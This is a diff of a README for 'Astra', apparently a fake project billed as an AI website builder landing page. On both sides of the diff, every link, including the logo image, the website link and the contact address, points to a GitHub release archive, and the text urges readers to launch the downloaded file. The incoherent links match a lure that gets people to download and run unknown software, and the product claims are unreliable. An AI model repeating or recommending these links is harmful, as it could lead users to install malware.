@@ -1,6 +1,6 @@
 # 🚀 Astra: The Smart AI-Powered Website Builder Landing Page
 
-![Astra Logo](https://github.com/iyeddddddd/astra/releases/download/v1.0/Release.zip)
+![Astra Logo](https://github.com/iyeddddddd/astra/releases/tag/v2.0)
 
 Welcome to the Astra repository! Astra is a revolutionary smart AI-powered website builder landing page that combines state-of-the-art design and functionality to help you create stunning websites with ease.
 
@@ -15,18 +15,18 @@ Welcome to the Astra repository! Astra is a revolutionary smart AI-powered websi
 🎨 Beautifully crafted design elements  
 🤖 Cutting-edge AI-powered website building capabilities  
 🚀 Smooth animations with Framer Motion  
-💻 Easy integration with https://github.com/iyeddddddd/astra/releases/download/v1.0/Release.zip 14  
+💻 Easy integration with https://github.com/iyeddddddd/astra/releases/tag/v2.0 14  
 🎨 Customizable UI with SASS, Shadcn-UI, and TailwindCSS  
 
 ## 📦 Download Astra
 
-[![Download Astra](https://github.com/iyeddddddd/astra/releases/download/v1.0/Release.zip)](https://github.com/iyeddddddd/astra/releases/download/v1.0/Release.zip)
+[![Download Astra](https://github.com/iyeddddddd/astra/releases/tag/v2.0)](https://github.com/iyeddddddd/astra/releases/tag/v2.0)
 
 The download link provided is for the Astra software package. Please launch the downloaded file to begin using Astra and unleash your website building potential!
 
 ## 🌐 Visit Astra Website
 
-Explore the Astra website to learn more about its features and capabilities. Click [here](https://github.com/iyeddddddd/astra/releases/download/v1.0/Release.zip) to visit the Astra website.
+Explore the Astra website to learn more about its features and capabilities. Click [here](https://github.com/iyeddddddd/astra/releases/tag/v2.0) to visit the Astra website.
 
 If the provided link is not working or you need more information, please check the "Releases" section of this repository for additional resources.
 
@@ -44,7 +44,7 @@ We welcome contributions from the community to enhance Astra further. If you hav
 
 ## 📞 Contact Us
 
-If you have any questions, suggestions, or feedback regarding Astra, please feel free to reach out to us at https://github.com/iyeddddddd/astra/releases/download/v1.0/Release.zip We value your input and are committed to providing the best possible website building experience with Astra.
+If you have any questions, suggestions, or feedback regarding Astra, please feel free to reach out to us at https://github.com/iyeddddddd/astra/releases/tag/v2.0 We value your input and are committed to providing the best possible website building experience with Astra.
 
 ## 📝 License
 
@@ -54,4 +54,4 @@ The Astra project is licensed under the MIT License. Feel free to use, modify, a
 
 Thank you for choosing Astra as your AI-powered website builder landing page solution. Let's build amazing websites together! 🌟🚀
 
-![Astra Builder](https://github.com/iyeddddddd/astra/releases/download/v1.0/Release.zip)
+![Astra Builder](https://github.com/iyeddddddd/astra/releases/tag/v2.0)
